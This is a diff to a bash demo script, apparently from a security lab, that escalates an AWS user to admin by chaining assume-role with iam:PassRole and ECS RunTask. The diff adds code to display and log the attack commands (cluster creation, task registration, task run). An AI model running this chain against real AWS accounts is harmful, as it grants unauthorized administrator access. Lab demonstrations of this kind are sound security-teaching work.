@@ -5,7 +5,9 @@
 #   Hop 1: Starting user assumes a role with ECS permissions
 #   Hop 2: Use the role's PassRole + ECS permissions to run a task with an admin role
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -13,6 +15,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-sts001-ecs002-starting-user"
@@ -80,6 +100,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -91,6 +112,7 @@ echo -e "${GREEN}[OK] Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}[OK] Retrieved account ID${NC}\n"
@@ -98,6 +120,7 @@ echo -e "${GREEN}[OK] Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd aws iam list-users --max-items 1
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
 else
@@ -124,6 +147,7 @@ STARTING_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${STARTING_ROLE}"
 echo "Target Role: $STARTING_ROLE_ARN"
 echo ""
 
+show_attack_cmd aws sts assume-role --role-arn $STARTING_ROLE_ARN --role-session-name demo-session --query 'Credentials' --output json
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $STARTING_ROLE_ARN \
     --role-session-name demo-session \
@@ -143,6 +167,7 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ROLE_IDENTITY"
 echo -e "${GREEN}[OK] Successfully assumed starting role${NC}"
@@ -156,6 +181,7 @@ echo ""
 echo -e "${YELLOW}Step 7: Verifying starting role permissions${NC}"
 echo "The starting role should have ECS and PassRole permissions..."
 echo "Still cannot list IAM users (not admin yet)..."
+show_cmd aws iam list-users --max-items 1
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Warning: Starting role can list IAM users${NC}"
 else
@@ -169,6 +195,7 @@ echo -e "${BLUE}Attack Vector: ecs:CreateCluster${NC}"
 echo "Cluster name: $CLUSTER_NAME"
 echo ""
 
+show_attack_cmd aws ecs create-cluster --region $AWS_REGION --cluster-name "$CLUSTER_NAME" --output json
 CLUSTER_RESULT=$(aws ecs create-cluster \
     --region $AWS_REGION \
     --cluster-name "$CLUSTER_NAME" \
@@ -263,6 +290,7 @@ TASK_DEF='{
   ]
 }'
 
+show_attack_cmd aws ecs register-task-definition --region $AWS_REGION --cli-input-json "<task-definition-json>" --output json
 REGISTER_RESULT=$(aws ecs register-task-definition \
     --region $AWS_REGION \
     --cli-input-json "$TASK_DEF" \
@@ -285,6 +313,7 @@ echo -e "${YELLOW}Step 11: Running ECS task on Fargate${NC}"
 echo -e "${BLUE}Attack Vector: ecs:RunTask${NC}"
 echo "This task will use the admin role to grant admin access to our starting user..."
 
+show_attack_cmd aws ecs run-task --region $AWS_REGION --cluster "$CLUSTER_NAME" --task-definition "$TASK_FAMILY" --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" --output json
 RUN_TASK_RESULT=$(aws ecs run-task \
     --region $AWS_REGION \
     --cluster "$CLUSTER_NAME" \
@@ -380,6 +409,7 @@ export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
 export AWS_REGION=$AWS_REGION
 
 # Verify identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 FINAL_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $FINAL_IDENTITY"
 echo -e "${GREEN}[OK] Switched to starting user credentials${NC}\n"
@@ -390,6 +420,7 @@ echo "Attempting to list IAM users with starting user credentials..."
 echo "(The ECS task should have attached AdministratorAccess to starting user)"
 echo ""
 
+show_cmd aws iam list-users --max-items 3 --output table
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}[OK] Successfully listed IAM users!${NC}"
@@ -401,6 +432,13 @@ else
     exit 1
 fi
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 # Summary
 echo -e "\n${GREEN}========================================${NC}"
